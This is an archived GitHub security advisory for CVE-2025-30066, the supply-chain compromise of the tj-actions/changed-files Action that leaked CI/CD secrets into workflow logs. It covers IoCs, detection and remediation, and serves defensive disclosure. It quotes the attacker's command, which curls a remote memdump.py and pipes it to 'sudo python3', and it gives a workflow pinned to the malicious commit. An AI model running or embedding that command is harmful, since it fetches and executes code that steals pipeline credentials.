---
url: "https://github.com/advisories/GHSA-mrrh-fwg8-r2c3"
title: "CVE-2025-30066 - GitHub Advisory Database"
site: "GitHub"
captured: "2026-11-02T18:44:02Z"
via: "live"
sha256: "3d4d2f60a002cb74b132f5a825f289aaa3ea78f1932c7e8498e3a2e15f38c3f1"
cited_in:
  - "docs/threats/02-supply-chain-packages.md"
---

# CVE-2025-30066 - GitHub Advisory Database

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://github.com/advisories/GHSA-mrrh-fwg8-r2c3>

##  tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets by reading actions logs.

High severity   GitHub Reviewed   Published Mar 15, 2025 to the GitHub Advisory Database • Updated Oct 22, 2025

## Package

tj-actions/changed-files  ([GitHub Actions](https://github.com/advisories?query=ecosystem%3Aactions))

## Affected versions

<= 45.0.7

## Patched versions

46.0.1

## Description

### Summary

A supply chain attack compromised the tj-actions/changed-files GitHub Action, impacting over 23,000 repositories. Attackers retroactively modified multiple version tags to reference a malicious commit, exposing CI/CD secrets in workflow logs. The vulnerability existed between March 14 and March 15, 2025, and has since been mitigated. This poses a significant risk of unauthorized access to sensitive information.

This has been patched in [v46.0.1](https://github.com/tj-actions/changed-files/releases/tag/v46.0.1).

### Details

The attack involved modifying the tj-actions/changed-files GitHub Action to execute a malicious Python script. This script extracted secrets from the Runner Worker process memory and printed them in GitHub Actions logs, making them publicly accessible in repositories with public workflow logs.

#### Key Indicators of Compromise (IoC):

- Malicious commit: [0e58ed8671d6b60d0890c21b07f8835ace038e67](https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67)
- Retroactively updated tags pointing to the malicious commit:

- v1.0.0: 0e58ed8671d6b60d0890c21b07f8835ace038e67
- v35.7.7-sec: 0e58ed8671d6b60d0890c21b07f8835ace038e67
- v44.5.1: 0e58ed8671d6b60d0890c21b07f8835ace038e67

#### Malicious Code Execution:

The malicious script downloaded and executed a Python script that scanned memory for secrets, base64-encoded them, and logged them in the build logs:

```
B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3`

```

This script targeted the Runner Worker process, extracting and exfiltrating its memory contents.

### Proof of Concept (PoC)

#### Steps to Reproduce:

- Create a GitHub Actions workflow using the tj-actions/changed-files action:

```
name: "tj-action changed-files incident"
on:
  pull_request:
    branches:
      - main
jobs:
  changed_files:
    runs-on: ubuntu-latest
    steps:
      - name: Get changed files
        id: changed-files
        uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67
```

- Run the workflow and inspect the logs in the Actions tab.
- Vulnerable workflows may display secrets in the logs.

#### Detection:

Analyze network traffic using [Harden-Runner](https://github.com/step-security/harden-runner), which detects unauthorized outbound requests to:

- gist.githubusercontent.com

Live reproduction logs:
🔗 [Harden-Runner Insights](https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357)

This attack was detected by StepSecurity when anomaly detection flagged an unauthorized outbound network call to gist.githubusercontent.com.

### Duration of Vulnerability

The vulnerability was active between March 14 and March 15, 2025.

### Action Required

-

Review your workflows executed between March 14 and March 15:

- Check the changed-files section for unexpected output.
- Decode suspicious output using the following command:

```
echo 'xxx' | base64 -d | base64 -d

```

- If the output contains sensitive information (e.g., tokens or secrets), revoke and rotate those secrets immediately.

-

Update workflows referencing the compromised commit:

- If your workflows reference the malicious commit directly by its SHA, update them immediately to avoid using the compromised version.

-

Tagged versions:

- If you are using tagged versions (e.g., v35, v44.5.1), no action is required as these tags have been updated and are now safe to use.

-

Rotate potentially exposed secrets:

- As a precaution, rotate any secrets that may have been exposed during this timeframe to ensure the continued security of your workflows.

### Impact

- Type of vulnerability: Supply chain attack, Secrets exposure, Information leakage
- Who is impacted:

- Over 23,000 repositories using tj-actions/changed-files.
- Organizations with public repositories are at the highest risk, as their logs may already be compromised.

- Potential consequences:

- Theft of CI/CD secrets (API keys, cloud credentials, SSH keys).
- Unauthorized access to source code, infrastructure, and production environments.
- Credential leaks in public repositories, enabling further supply chain attacks.

### References

- https://nvd.nist.gov/vuln/detail/CVE-2025-30066
- [tj-actions/changed-files#2463](https://github.com/tj-actions/changed-files/issues/2463)
- https://github.com/github/docs/blob/962a1c8dccb8c0f66548b324e5b921b5e4fbc3d6/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md?plain=1#L191-L193
- https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised
- https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
- [chains-project/maven-lockfile#1111](https://github.com/chains-project/maven-lockfile/pull/1111)
- [rackerlabs/genestack#903](https://github.com/rackerlabs/genestack/pull/903)
- https://news.ycombinator.com/item?id=43367987
- https://web.archive.org/web/20250315060250/https://github.com/tj-actions/changed-files/issues/2463
- [espressif/arduino-esp32#11127](https://github.com/espressif/arduino-esp32/issues/11127)
- [modal-labs/modal-examples#1100](https://github.com/modal-labs/modal-examples/issues/1100)
- [tj-actions/changed-files#2464](https://github.com/tj-actions/changed-files/issues/2464)
- https://github.com/tj-actions/changed-files/blob/45fb12d7a8bedb4da42342e52fe054c6c2c3fd73/README.md?plain=1#L20-L28
- https://sysdig.com/blog/detecting-and-mitigating-the-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
- https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
- https://www.sweet.security/blog/cve-2025-30066-tj-actions-supply-chain-attack
- https://www.stream.security/post/github-action-supply-chain-attack-exposes-secrets-what-you-need-to-know-and-how-to-respond
- [tj-actions/changed-files#2477](https://github.com/tj-actions/changed-files/issues/2477)
- https://github.com/tj-actions/changed-files/releases/tag/v46.0.1
- https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066
- https://blog.gitguardian.com/compromised-tj-actions
- [GHSA-mw4p-6x4p-x5m5](https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5)
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-30066
- https://news.ycombinator.com/item?id=43368870

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2025-30066) Mar 15, 2025

Published to the GitHub Advisory Database Mar 15, 2025

Reviewed Mar 15, 2025

Last updated Oct 22, 2025

### Severity

High

/ 10

#### CVSS v3 base metrics

Attack vector

Network

Attack complexity

Low

Privileges required

None

User interaction

None

Scope

Changed

Confidentiality

High

Integrity

None

Availability

None

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N/E:H

### EPSS score

(99th percentile)

### Weaknesses

Weakness CWE-506

####   [Embedded Malicious Code](https://github.com/advisories?query=cwe%3A506)

The product contains code that appears to be malicious in nature.  [Learn more on MITRE.](https://cwe.mitre.org/data/definitions/506.html)

### CVE ID

CVE-2025-30066

### GHSA ID

GHSA-mrrh-fwg8-r2c3

### Source code

[tj-actions/changed-files](https://github.com/tj-actions/changed-files)

### Credits

-   https://github.com/varunsh-coder [varunsh-coder](https://github.com/varunsh-coder)   Analyst

Loading  Checking history

See something to contribute? [Suggest improvements for this vulnerability](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3/improve).
